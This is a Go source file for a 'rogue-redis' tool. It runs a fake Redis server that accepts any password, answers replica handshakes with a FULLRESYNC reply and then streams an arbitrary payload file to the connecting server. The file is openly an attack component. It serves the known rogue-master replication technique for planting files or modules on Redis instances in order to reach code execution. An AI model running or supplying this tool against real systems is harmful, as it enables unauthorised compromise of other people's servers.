package main

import (
	"bytes"
	"flag"
	"fmt"
	"io/ioutil"
	"os"
	"strings"

	"github.com/buglloc/simplelog"
	"github.com/tidwall/redcon"
)

var addr = ":6380"

func main() {
	flag.Parse()
	payloadPath := flag.Arg(0)
	if payloadPath == "" {
		fmt.Println("Usage: rogue-redis [/path/to/payload|-]")
		os.Exit(1)
	}

	var input *os.File
	if payloadPath == "-" {
		input = os.Stdin
	} else {
		opened, err := os.Open(payloadPath)
		if err != nil {
			log.Crit("failed to open payload for reading", "path", payloadPath, "err", err.Error())
			os.Exit(1)
		}
		defer opened.Close()
		input = opened
	}

	payload, err := ioutil.ReadAll(input)
	if err != nil {
		log.Crit("failed read payload", "path", payloadPath, "err", err.Error())
		os.Exit(1)
	}

	go log.Warn("started server", "addr", addr)
	err = redcon.ListenAndServe(addr,
		func(conn redcon.Conn, cmd redcon.Command) {
			log.Warn("new command: " + string(bytes.Join(cmd.Args, []byte(" "))))
			switch strings.ToLower(string(cmd.Args[0])) {
			default:
				conn.WriteError("ERR unknown command '" + string(cmd.Args[0]) + "'")
			case "ping":
				conn.WriteString("PONG")
			case "auth":
				conn.WriteString("OK")
			case "quit":
				conn.WriteString("OK")
				_ = conn.Close()
			case "replconf":
				conn.WriteString("OK")
			case "psync":
				if len(cmd.Args) != 3 {
					conn.WriteError("ERR wrong number of arguments for '" + string(cmd.Args[0]) + "' command")
					return
				}

				conn.WriteString("FULLRESYNC aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa 1")
				conn.WriteBulk(payload)
			}
		},
		func(conn redcon.Conn) bool {
			// use this function to accept or deny the connection.
			log.Warn("new connection", "addr", conn.RemoteAddr())
			return true
		},
		func(conn redcon.Conn, err error) {
			// this is called when the connection has been closed
			log.Warn("closed", "addr", conn.RemoteAddr(), "err", err.Error())
		},
	)
	if err != nil {
		log.Error(err.Error())
	}
}
